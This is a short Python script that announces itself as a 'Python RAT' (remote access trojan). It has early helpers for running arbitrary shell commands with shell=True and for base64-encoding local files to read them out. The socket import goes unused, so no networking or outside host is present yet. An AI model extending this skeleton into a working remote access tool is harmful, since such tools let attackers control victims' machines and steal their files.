import os
import sys
import base64
import socket
import subprocess

### Execute ###
def Exec(command):
    subprocess.Popen(command, shell=True)

    # with subprocess.Popen(['/bin/sh', '-c'], 'pwd',stdout=subprocess.PIPE,stderr=subprocess.STDOUT) as proc: 
    #     word = proc.stdout.read().strip()

    # return word
### Upload ###)
def Upload(b64String, outputFile):
    
    OutputText = base64.b64encode(b64String)
    
    OutputFile = open(outputFile, 'wb')
    OutputFile.write(OutputText)
    return

    
### Download ###
def Download(fileName):
    localFile = open(fileName, 'rb')
    OutputText = base64.b64encode(localFile.read())
    print(OutputText)
    localFile.close()
    return OutputText


def main():
    if __name__ == '__main__':
        print("Welcome to the Python RAT")
        # b64String = "test"
        # Upload(b64String, "Output.b64.txt")

        Download("test.txt")
        command = 'ls'
        Exec(command)


main()